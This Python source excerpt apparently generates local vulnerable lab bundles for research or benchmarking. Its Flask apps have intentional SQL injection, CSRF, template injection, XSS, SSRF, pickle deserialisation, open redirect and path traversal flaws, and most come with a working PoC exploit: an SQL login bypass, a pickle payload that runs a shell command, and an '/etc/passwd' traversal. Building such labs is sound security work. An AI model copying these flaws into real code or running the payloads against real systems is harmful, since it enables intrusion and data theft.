        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return vuln == "cwe-89" or "sqli" in pattern_id or "sql injection" in label or label == "sqli"

    def _is_csrf_family(self) -> bool:
        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return vuln == "cwe-352" or "csrf" in pattern_id or "csrf" in label or "cross-site request forgery" in label

    def _is_xss_family(self) -> bool:
        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return vuln == "cwe-79" or "xss" in pattern_id or "cross-site scripting" in label or label == "xss"

    def _is_ssrf_family(self) -> bool:
        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return (
            vuln == "cwe-918"
            or "ssrf" in pattern_id
            or "server-side request forgery" in label
            or label == "ssrf"
        )

    def _is_deserialization_family(self) -> bool:
        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return (
            vuln == "cwe-502"
            or "deserialization" in pattern_id
            or "deserialization" in label
        )

    def _is_path_traversal_family(self) -> bool:
        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return vuln == "cwe-22" or "path-traversal" in pattern_id or "path traversal" in label or "directory traversal" in label

    def _is_open_redirect_family(self) -> bool:
        vuln = str((self._requirement or {}).get("vuln_id") or "").strip().lower()
        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
        return (
            "open-redirect" in pattern_id
            or "open redirect" in label
            or "unvalidated redirect" in label
            or vuln in {"name-open-redirect", "name_open_redirect"}
        )

    def _fallback_pattern_tags(self, vuln_id: str) -> List[str]:
        tags = {"fallback", "stub", str(vuln_id or "").strip().lower()}
        tags.update(family_canonical_tags(vuln_id))
        return sorted(token for token in tags if isinstance(token, str) and token.strip())

    def _fallback_manifest_from_parts(
        self,
        *,
        vuln_id: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
        requirements_content: str,
        app_content: str,
        poc_content: Optional[str],
        service_path: str = "app.py",
    ) -> Dict[str, Any]:
        deps = [
            line.strip()
            for line in requirements_content.splitlines()
            if isinstance(line, str) and line.strip() and not line.strip().startswith("#")
        ]
        files: List[Dict[str, Any]] = [
            {
                "path": "Dockerfile",
                "role": "helper",
                "description": "Build Python image for fallback bundle.",
                "content": (
                    "FROM python:3.11-slim\n"
                    "WORKDIR /app\n"
                    "COPY . /app\n"
                    "RUN pip install --no-cache-dir -r requirements.txt\n"
                    f"EXPOSE {port}\n"
                    f"CMD [\"python\", \"{service_path}\"]\n"
                ),
            },
            {
                "path": "requirements.txt",
                "role": "helper",
                "description": "Pinned deps for fallback bundle.",
                "content": requirements_content,
            },
            {
                "path": service_path,
                "role": "service_main",
                "description": f"{stack} family-aware fallback service.",
                "content": app_content,
            },
        ]
        if poc_content is not None:
            files.append(
                {
                    "path": "poc.py",
                    "role": "poc_entry",
                    "description": "Family-aware fallback PoC.",
                    "content": poc_content,
                }
            )
        files.append(
            {
                "path": "README.md",
                "role": "helper",
                "description": "Quickstart instructions.",
                "content": (
                    f"# {vuln_id} fallback bundle\n"
                    "```bash\n"
                    "docker build -t fallback-bundle .\n"
                    f"docker run -p {port}:{port} fallback-bundle\n"
                    f"python poc.py --base-url http://127.0.0.1:{port}\n"
                    "```\n"
                ),
            }
        )
        poc_block: Dict[str, Any] = {
            "cmd": "python poc.py --base-url {{base_url}}",
            "success_signature": success_signature,
        }
        if flag_token:
            poc_block["flag_token"] = flag_token
        return {
            "intent": f"{vuln_id} fallback synthesis",
            "pattern_tags": self._fallback_pattern_tags(vuln_id),
            "files": files,
            "deps": deps,
            "build": {"command": "pip install --no-cache-dir -r requirements.txt"},
            "run": {"command": f"python {service_path}", "port": port},
            "poc": poc_block,
            "notes": notes,
            "metadata": {
                "sid": self.sid,
                "stack": stack,
                "cwe": vuln_id,
                "generation_origin": "deterministic_fallback",
                "fallback_class": "family_aware",
            },
        }

    def _fallback_manifest_sqli(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "from pathlib import Path\n"
            "import sqlite3\n"
            "from flask import Flask, jsonify, request\n\n"
            "app = Flask(__name__)\n"
            "DB_PATH = Path('/tmp/sqli-demo.db')\n"
            "SCHEMA_SQL = '''\n"
            "CREATE TABLE IF NOT EXISTS users (\n"
            "    id INTEGER PRIMARY KEY AUTOINCREMENT,\n"
            "    username TEXT,\n"
            "    password TEXT\n"
            ");\n"
            "DELETE FROM users;\n"
            "INSERT INTO users (username, password) VALUES ('admin', 'secret');\n"
            "INSERT INTO users (username, password) VALUES ('guest', 'guest');\n"
            "'''\n\n"
            "def init_db() -> None:\n"
            "    conn = sqlite3.connect(DB_PATH)\n"
            "    conn.executescript(SCHEMA_SQL)\n"
            "    conn.commit()\n"
            "    conn.close()\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/login')\n"
            "def login():\n"
            "    query = (\n"
            "        \"SELECT id, username FROM users \"\n"
            "        \"WHERE username = '\" + request.args.get('username', '') + \"' \"\n"
            "        \"AND password = '\" + request.args.get('password', '') + \"'\"\n"
            "    )\n"
            "    conn = sqlite3.connect(DB_PATH)\n"
            "    conn.row_factory = sqlite3.Row\n"
            "    cur = conn.cursor()\n"
            "    rows = cur.execute(query).fetchall()\n"
            "    conn.close()\n"
            "    return jsonify({'match': bool(rows), 'rows': [dict(row) for row in rows], 'query': query})\n\n"
            "if __name__ == '__main__':\n"
            "    init_db()\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import json\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.parse import urlencode\n"
            "from urllib.request import urlopen\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {flag_token!r}\n"
            "DEFAULT_PARAMS = {'username': \"admin' OR '1'='1\", 'password': 'irrelevant'}\n\n"
            "def exploit(base_url: str) -> bool:\n"
            "    url = base_url.rstrip('/') + '/login?' + urlencode(DEFAULT_PARAMS)\n"
            "    try:\n"
            "        with urlopen(url, timeout=5) as resp:\n"
            "            body = resp.read().decode('utf-8', errors='ignore')\n"
            "    except (HTTPError, URLError) as exc:\n"
            "        print(f'[sqli-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    try:\n"
            "        payload = json.loads(body)\n"
            "    except json.JSONDecodeError:\n"
            "        return False\n"
            "    rows = payload.get('rows') or []\n"
            "    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows)\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='SQLi fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        if FLAG_TOKEN:\n"
            "            print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[sqli-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_csrf(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "from flask import Flask, jsonify, request, session\n\n"
            "app = Flask(__name__)\n"
            "app.secret_key = 'csrf-fallback-secret'\n"
            "BALANCES = {'victim': 1000, 'attacker': 0}\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/login')\n"
            "def login():\n"
            "    user = request.args.get('user', 'victim')\n"
            "    session['user'] = user\n"
            "    BALANCES.setdefault(user, 1000)\n"
            "    return jsonify({'logged_in_as': user})\n\n"
            "@app.post('/transfer')\n"
            "def transfer():\n"
            "    user = session.get('user', 'victim')\n"
            "    recipient = request.form.get('recipient', 'attacker')\n"
            "    amount = int(request.form.get('amount', '250'))\n"
            "    BALANCES[recipient] = BALANCES.get(recipient, 0) + amount\n"
            "    BALANCES[user] = BALANCES.get(user, 1000) - amount\n"
            "    return jsonify({'ok': True, 'by': user, 'recipient': recipient, 'amount': amount, 'recipient_balance': BALANCES[recipient]})\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import http.cookiejar\n"
            "import json\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.parse import urlencode\n"
            "from urllib.request import HTTPCookieProcessor, Request, build_opener\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {flag_token!r}\n\n"
            "def exploit(base_url: str) -> bool:\n"
            "    cookie_jar = http.cookiejar.CookieJar()\n"
            "    opener = build_opener(HTTPCookieProcessor(cookie_jar))\n"
            "    try:\n"
            "        with opener.open(base_url.rstrip('/') + '/login?user=victim', timeout=5) as resp:\n"
            "            resp.read()\n"
            "        body = urlencode({'recipient': 'attacker', 'amount': '250'}).encode('utf-8')\n"
            "        req = Request(base_url.rstrip('/') + '/transfer', data=body, method='POST')\n"
            "        req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n"
            "        with opener.open(req, timeout=5) as resp:\n"
            "            payload = json.loads(resp.read().decode('utf-8', errors='ignore'))\n"
            "    except (HTTPError, URLError, json.JSONDecodeError) as exc:\n"
            "        print(f'[csrf-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250'\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='CSRF fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        if FLAG_TOKEN:\n"
            "            print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[csrf-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_template_injection(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "from flask import Flask, render_template_string, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/greet')\n"
            "def greet():\n"
            "    name = request.args.get('name', 'Guest')\n"
            "    template = '<h1>Hello ' + name + '</h1>'\n"
            "    return render_template_string(template)\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=normalized_vuln or vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
            app_content=app_content,
            poc_content=None,
        )

    def _fallback_manifest_xss(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "from flask import Flask, render_template_string, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/search')\n"
            "def search():\n"
            "    # Reflected cross-site scripting: unescaped reflection of <script> payloads into a template response.\n"
            "    name = request.args.get('name', 'Guest')\n"
            "    template = \"<div class='result'>\" + name + \"</div>\"\n"
            "    return render_template_string(template)\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.parse import quote\n"
            "from urllib.request import urlopen\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {flag_token!r}\n"
            "DEFAULT_PAYLOAD = '<script>alert(1)</script>'\n\n"
            "def exploit(base_url: str, payload: str) -> bool:\n"
            "    url = base_url.rstrip('/') + '/search?name=' + quote(payload)\n"
            "    try:\n"
            "        with urlopen(url, timeout=5) as resp:\n"
            "            body = resp.read().decode('utf-8', errors='ignore')\n"
            "    except (HTTPError, URLError) as exc:\n"
            "        print(f'[xss-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    return payload in body\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='XSS fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url, args.payload):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        if FLAG_TOKEN:\n"
            "            print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[xss-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=normalized_vuln or vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_ssrf(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        effective_flag = flag_token or "FLAG{SSRF_OK}"
        app_content = (
            "import requests\n"
            "from flask import Flask, jsonify, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/metadata')\n"
            "def metadata():\n"
            f"    return jsonify({{'flag': {effective_flag!r}, 'service': 'metadata'}})\n\n"
            "@app.get('/fetch')\n"
            "def fetch():\n"
            "    # server-side request forgery: user-controlled url reaches requests.get\n"
            "    target_url = request.args.get('url', 'http://127.0.0.1:8000/metadata')\n"
            "    resp = requests.get(target_url, timeout=2)\n"
            "    return resp.text, resp.status_code, {'Content-Type': resp.headers.get('Content-Type', 'text/plain')}\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import json\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.parse import quote\n"
            "from urllib.request import urlopen\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {effective_flag!r}\n"
            "DEFAULT_TARGET = 'http://127.0.0.1:8000/metadata'\n\n"
            "def exploit(base_url: str, target: str) -> bool:\n"
            "    url = base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')\n"
            "    try:\n"
            "        with urlopen(url, timeout=5) as resp:\n"
            "            body = resp.read().decode('utf-8', errors='ignore')\n"
            "    except (HTTPError, URLError) as exc:\n"
            "        print(f'[ssrf-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    try:\n"
            "        payload = json.loads(body)\n"
            "    except json.JSONDecodeError:\n"
            "        return False\n"
            "    return str(payload.get('flag')) == FLAG_TOKEN\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='SSRF fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url, args.payload):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[ssrf-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=normalized_vuln or vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=effective_flag,
            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_deserialization(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        effective_flag = flag_token or "FLAG{DESER_OK}"
        app_content = (
            "from pathlib import Path\n"
            "import pickle\n"
            "from flask import Flask, jsonify, request\n\n"
            "app = Flask(__name__)\n"
            "FLAG_PATH = Path('/tmp/deser-flag.txt')\n"
            f"FLAG_VALUE = {effective_flag!r}\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.post('/deserialize')\n"
            "def deserialize_payload():\n"
            "    # insecure deserialization of attacker-controlled serialized payload.\n"
            "    payload = request.get_data()\n"
            "    result = pickle.loads(payload)\n"
            "    return jsonify({'result': str(result)})\n\n"
            "def init_runtime_state() -> None:\n"
            "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')\n\n"
            "if __name__ == '__main__':\n"
            "    init_runtime_state()\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import json\n"
            "import pickle\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.request import Request, urlopen\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {effective_flag!r}\n\n"
            "class Exploit:\n"
            "    def __reduce__(self):\n"
            "        import subprocess\n"
            "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))\n\n"
            "def exploit(base_url: str) -> bool:\n"
            "    target = base_url.rstrip('/') + '/deserialize'\n"
            "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)\n"
            "    request_obj = Request(target, data=payload, method='POST')\n"
            "    request_obj.add_header('Content-Type', 'application/octet-stream')\n"
            "    try:\n"
            "        with urlopen(request_obj, timeout=5) as resp:\n"
            "            body = resp.read().decode('utf-8', errors='ignore')\n"
            "    except (HTTPError, URLError) as exc:\n"
            "        print(f'[deser-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    try:\n"
            "        payload = json.loads(body)\n"
            "    except json.JSONDecodeError:\n"
            "        return False\n"
            "    return str(payload.get('result')) == FLAG_TOKEN\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='Deserialization fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[deser-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=normalized_vuln or vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=effective_flag,
            requirements_content="Flask==3.0.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_open_redirect(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "from flask import Flask, redirect, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/go')\n"
            "def go():\n"
            "    # Open redirect via unvalidated redirect target supplied by the next parameter.\n"
            "    next_url = request.args.get('next', 'https://example.com')\n"
            "    return redirect(next_url, code=302)\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import sys\n"
            "import requests\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {flag_token!r}\n"
            "DEFAULT_TARGET = 'https://evil.example/landing'\n\n"
            "def exploit(base_url: str, target: str) -> bool:\n"
            "    url = base_url.rstrip('/') + '/go'\n"
            "    try:\n"
            "        resp = requests.get(url, params={'next': target}, timeout=5, allow_redirects=False)\n"
            "    except requests.RequestException as exc:\n"
            "        print(f'[open-redirect-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    location = resp.headers.get('Location', '')\n"
            "    return resp.status_code in {301, 302, 303, 307, 308} and location == target\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='Open Redirect fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url, args.payload):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        if FLAG_TOKEN:\n"
            "            print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[open-redirect-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _fallback_manifest_path_traversal(
        self,
        *,
        vuln_id: str,
        normalized_vuln: str,
        stack: str,
        port: int,
        notes: str,
        success_signature: str,
        flag_token: str,
    ) -> Dict[str, Any]:
        app_content = (
            "import os\n"
            "from pathlib import Path\n"
            "from flask import Flask, request\n\n"
            "app = Flask(__name__)\n"
            "BASE_DIR = Path('/tmp/path-demo')\n"
            "BASE_DIR.mkdir(parents=True, exist_ok=True)\n"
            "(BASE_DIR / 'note.txt').write_text('safe-note', encoding='utf-8')\n\n"
            "@app.get('/health')\n"
            "def health():\n"
            "    return {'ok': True}\n\n"
            "@app.get('/download')\n"
            "def download():\n"
            "    path = request.args.get('path', 'note.txt')\n"
            "    target = os.path.join(str(BASE_DIR), path)\n"
            "    with open(target, 'r', encoding='utf-8', errors='ignore') as handle:\n"
            "        return handle.read()\n\n"
            "if __name__ == '__main__':\n"
            f"    app.run(host='0.0.0.0', port={port})\n"
        )
        poc_content = (
            "import argparse\n"
            "import sys\n"
            "from urllib.error import HTTPError, URLError\n"
            "from urllib.parse import quote\n"
            "from urllib.request import urlopen\n\n"
            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
            f"FLAG_TOKEN = {flag_token!r}\n"
            "DEFAULT_PATH = '../../../../etc/passwd'\n\n"
            "def exploit(base_url: str) -> bool:\n"
            "    target = base_url.rstrip('/') + '/download?path=' + quote(DEFAULT_PATH)\n"
            "    try:\n"
            "        with urlopen(target, timeout=5) as resp:\n"
            "            body = resp.read().decode('utf-8', errors='ignore')\n"
            "    except (HTTPError, URLError) as exc:\n"
            "        print(f'[path-fallback] request failed: {exc}', file=sys.stderr)\n"
            "        return False\n"
            "    return 'root:' in body or 'localhost' in body\n\n"
            "def main() -> None:\n"
            "    parser = argparse.ArgumentParser(description='Path traversal fallback PoC')\n"
            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
            "    args = parser.parse_args()\n"
            "    if exploit(args.base_url):\n"
            "        print(SUCCESS_SIGNATURE)\n"
            "        if FLAG_TOKEN:\n"
            "            print(FLAG_TOKEN)\n"
            "        raise SystemExit(0)\n"
            "    print('[path-fallback] exploit did not succeed', file=sys.stderr)\n"
            "    raise SystemExit(1)\n\n"
            "if __name__ == '__main__':\n"
            "    main()\n"
        )
        return self._fallback_manifest_from_parts(
            vuln_id=normalized_vuln or vuln_id,
            stack=stack,
            port=port,
            notes=notes,
            success_signature=success_signature,
            flag_token=flag_token,
            requirements_content="Flask==3.0.0\n",
            app_content=app_content,
            poc_content=poc_content,
        )

    def _guard_manifest_with_autofix(
        self,
        manifest: Dict[str, Any],
        *,
        precomputed_llm: Dict[str, Any] | None = None,
        auto_patch: Dict[str, Any] | None = None,
    ) -> Tuple[List[str], Dict[str, Any]]:
        violations, report = self._guard_manifest(
            manifest,
            precomputed_llm=precomputed_llm,
            auto_patch=auto_patch,
        )
        trace: List[Dict[str, Any]] = []
        max_attempts = self._guard_autofix_max_attempts
        if not violations or max_attempts <= 0 or self._guard_autofix_level == "none":
            if trace:
                report["guard_autofix_trace"] = trace
            return violations, report

        if self._has_unsupported_guard_op(violations):
            trace.append(
                {
                    "attempt": 0,
                    "patched": False,
                    "effective": False,
                    "detail": {
                        "mode": "skip",
                        "reason": "guard_dsl_unsupported_op",
                        "message": "autofix skipped because guard DSL mismatch must be resolved in researcher guard spec",
                    },
                }
            )
            report["guard_autofix_trace"] = trace
            return violations, report

        for attempt in range(1, max_attempts + 1):
            before_digest = self._manifest_digest(manifest)
            patched, detail = self._attempt_guard_autofix(
                manifest=manifest,
                violations=violations,
                level=self._guard_autofix_level,
            )
            after_digest = self._manifest_digest(manifest)
            effective = bool(patched and before_digest != after_digest)
            trace.append(
                {
                    "attempt": attempt,
                    "patched": patched,
                    "effective": effective,
                    "detail": detail,
                    "before_digest": before_digest,
                    "after_digest": after_digest,
                }
            )
            if not patched:
                break
            if not effective:
                break
            violations, report = self._guard_manifest(
                manifest,
                precomputed_llm=precomputed_llm,
                auto_patch=auto_patch,
            )
            if not violations:
                break

        if trace:
            report["guard_autofix_trace"] = trace
        return violations, report

    def _attempt_guard_autofix(
        self,
        *,
        manifest: Dict[str, Any],
        violations: List[str],
        level: str,
    ) -> Tuple[bool, Dict[str, Any]]:
        if level == "manifest":
            patched = self._apply_manifest_autofix_hints(manifest, violations)
            return patched, {"mode": "manifest", "violations": violations[:6]}
        if level == "code":
            patched = self._apply_code_autofix_with_llm(manifest, violations)
            return patched, {"mode": "code", "violations": violations[:6]}
        return False, {"mode": "none"}

    @staticmethod
    def _manifest_digest(manifest: Dict[str, Any]) -> str:
        serialized = json.dumps(manifest, sort_keys=True, ensure_ascii=False)
        return hashlib.sha256(serialized.encode("utf-8")).hexdigest()

    @staticmethod
    def _has_unsupported_guard_op(violations: List[str]) -> bool:
        for violation in violations:
            if not isinstance(violation, str):
                continue
            if "unsupported guard assertion op:" in violation.lower():
                return True
        return False

    def _apply_manifest_autofix_hints(self, manifest: Dict[str, Any], violations: List[str]) -> bool:
        # Lightweight deterministic autofix: ensure deps from guard hints are present.
        payload = self._guard_spec_payload if isinstance(self._guard_spec_payload, dict) else {}
        hints = payload.get("autofix_hints") if isinstance(payload, dict) else []
        if not isinstance(hints, list):
            hints = []
        changed = False
        deps = manifest.get("deps")
        if not isinstance(deps, list):
            deps = []
            manifest["deps"] = deps
        dep_names = {str(item).strip().lower() for item in deps if isinstance(item, str)}

        for hint in hints:
            if not isinstance(hint, dict):
                continue
            suggested = hint.get("add_deps")
            if isinstance(suggested, str):
                suggested = [suggested]
            if not isinstance(suggested, list):
                continue
            for dep in suggested:
                if not isinstance(dep, str):
                    continue
                token = dep.strip()
                if not token:
                    continue
                key = token.lower()
                if key in dep_names:
                    continue
                deps.append(token)
                dep_names.add(key)
                changed = True
        if changed:
            manifest["deps"] = deps
            manifest = self._sync_requirements_with_deps(manifest, dep_names) or manifest
        return changed

    def _apply_code_autofix_with_llm(self, manifest: Dict[str, Any], violations: List[str]) -> bool:
        if not isinstance(self._guard_spec_payload, dict) or not self._guard_spec_payload:
            return False
        prompt = build_guard_autofix_prompt(
            requirement=self._requirement,
            manifest=manifest,
            violations=violations,
            guard_spec=self._guard_spec_payload,
        )
        raw = self.llm.generate(prompt)
